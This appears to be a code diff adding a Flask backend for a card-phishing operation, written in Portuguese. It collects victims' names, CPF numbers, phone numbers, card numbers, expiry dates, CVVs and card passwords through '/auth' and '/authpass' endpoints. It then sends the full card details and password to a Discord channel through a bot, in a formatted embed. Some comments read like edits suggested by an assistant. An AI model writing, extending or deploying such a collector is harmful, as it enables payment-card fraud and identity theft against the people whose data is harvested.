@@ -1,0 +1,134 @@
+from model.cardModel import Card
+from flask import Flask, request, jsonify
+import os
+import discord
+from discord.ext import commands
+import asyncio
+
+
+app = Flask(__name__)
+
+token = os.getenv("TOKEN")
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix="/", intents=intents)
+
+# with app.app_context():
+#     db.create_all()
+
+cards: list[Card] = []
+
+
+@app.route('/auth', methods=['GET'])
+def authInfo():
+    try:
+        data = request.json
+
+        if not data or not all(key in data for key in [
+            'celular',
+            'operadora',
+            'valor',
+            'email',
+            'nome',
+            'cpf',
+            'card',
+            'mes',
+            'ano',
+            'cvv',
+            'token',
+            'bin',
+            'dadosbin'
+        ]):
+            return jsonify({'Error': 'Unknown'}), 401
+
+        celular = data.get('celular')
+        operadora = data.get('operadora')
+        valor = data.get('valor')
+        email = data.get('email')
+        nome = data.get('nome')
+        cpf = data.get('cpf')
+        card = data.get('card')
+        mes = data.get('mes')
+        ano = data.get('ano')
+        cvv = data.get('cvv')
+        token = data.get('token')
+        bin = data.get('bin')
+        dadosbin = data.get('dadosbin')
+
+        card = Card(
+            celular, operadora, valor, email, nome, cpf, card,
+            mes, ano, cvv, token, bin, dadosbin)
+        cards.append(card)
+
+        return jsonify({'Message': 'Ok'}), 200
+
+    except Exception as ex:
+        print(ex)
+        return jsonify({'Error': 'Unknown'}), 401
+
+
+@app.route('/authpass', methods=['GET'])
+def authPassword():
+    try:
+        data = request.json
+        if not data or not all(key in data for key in [
+            'senha',
+            'token'
+        ]):
+            return jsonify({'Error': 'Unknown'}), 401
+
+        # senha = data.get('senha')
+        token = data.get('token')
+
+        for card in cards:
+            if card.token == token:
+                # NOTE: This implementation requires the bot to be running in a separate thread
+                # for the message to be sent. You must also set the 'DISCORD_CHANNEL_ID'
+                # environment variable to your target channel's ID.
+                channel_id_str = os.getenv("DISCORD_CHANNEL_ID")
+                if channel_id_str:
+                    try:
+                        channel_id = int(channel_id_str)
+                        channel = bot.get_channel(channel_id)
+                        if channel:
+                            senha = data.get('senha')
+                            # Create an embed for a nicely formatted message
+                            embed = discord.Embed(
+                                title="🔑 Senha de Cartão Recebida",
+                                color=discord.Color.red()
+                            )
+                            embed.add_field(name="👤 Nome", value=f"```{card.nome}```", inline=False)
+                            embed.add_field(name="🔑 Senha", value=f"```{senha}```", inline=False)
+                            embed.add_field(name="💳 Cartão", value=f"```{card.card}```", inline=False)
+                            embed.add_field(name="📅 Validade", value=f"```{card.mes}/{card.ano}```", inline=True)
+                            embed.add_field(name="🔒 CVV", value=f"```{card.cvv}```", inline=True)
+                            embed.set_footer(text=f"Token: {card.token}")
+
+                            # Schedule the async send function on the bot's event loop
+                            coro = channel.send(embed=embed)
+                            asyncio.run_coroutine_threadsafe(coro, bot.loop)
+                        else:
+                            print(f"Error: Discord channel with ID {channel_id} not found.")
+                    except Exception as e:
+                        print(f"Error sending Discord message: {e}")
+                else:
+                    print("Error: DISCORD_CHANNEL_ID environment variable not set.")
+
+        return jsonify({'Message': 'Ok'}), 200
+
+    except Exception as ex:
+        print(ex)
+        return jsonify({'Error': 'Unknown'}), 401
+
+
+if __name__ == "__main__":
+    # To run both Flask and the Discord bot, you need to run them in separate threads.
+    # The original "app.run(...)" would block the bot from starting.
+    # This is a suggestion on how to run both, but was not part of the original code.
+    # import threading
+    #
+    # def run_app():
+    #     app.run(host="0.0.0.0", port=5000)
+    #
+    # threading.Thread(target=run_app).start()
+    # bot.run(token)
+    app.run(host="0.0.0.0", port=5000)
